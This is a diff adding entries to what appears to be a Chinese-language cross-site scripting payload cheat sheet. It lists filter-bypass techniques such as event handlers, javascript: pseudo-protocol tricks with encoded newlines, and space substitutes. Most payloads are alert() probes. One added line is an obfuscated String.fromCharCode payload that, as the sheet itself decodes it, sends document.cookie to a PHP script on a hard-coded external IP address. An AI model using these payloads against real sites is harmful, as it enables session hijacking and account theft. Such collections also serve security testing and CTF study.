@@ -8,15 +8,24 @@
 <img src="1" onerror="">
 <img src="1" onerror="alert(1)"> 
 <img src=x onerror=alert(233)>
+<aaaa id="c" onfocus="alert(1)" tabindex=0>
 
 
 
 
 <iframe src=javascript://%0aalert('iframe')>
+<iframe src=javascript://qq.com%0aalert('iframe')>
+//注释当前行，%a换行
 <embed src="https://c0olw.github.io/pic/1.html">
 <audio src=x onerror=confirm("casrc")> 
 
 伪协议：
+javascript:alert(1)
+javascript://comment％0aalert(1)
+//注释当前行，%a换行
+javascript://qq.com%0aalert('iframe')
+javascript://comment％250aalert(1)
+
 <iframe src="javascript:alert(111)"></iframe>  //火狐/IE/谷歌都支持
 <a href="javascript:alert(111)">aaa</a>
 如果在a标签中可以用伪协议绕过。
@@ -42,6 +51,10 @@ value中的值”闭合
 过alert,用prompt(),comfrim()
 
 使用string.fromCharCode()编码后，在用函数解码
+<body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));>
+
+String.fromCharCode()里就是
+<script>document.location.href='http://120.46.41.173/Jay17/127.php?Cookie='+document.cookie</script>
 ```
 
 hackbar工具混淆：
@@ -52,7 +65,8 @@ hackbar工具混淆：
 
 空格输入被过滤:
 ```
-用%0d(回车) %0a(换行) %0c代替
+用%0d(回车) %0a(换行) %0c  /  /**/代替
+<img/src/onerror=alert(1)>1
 ```
 
 括号()输入被过滤:
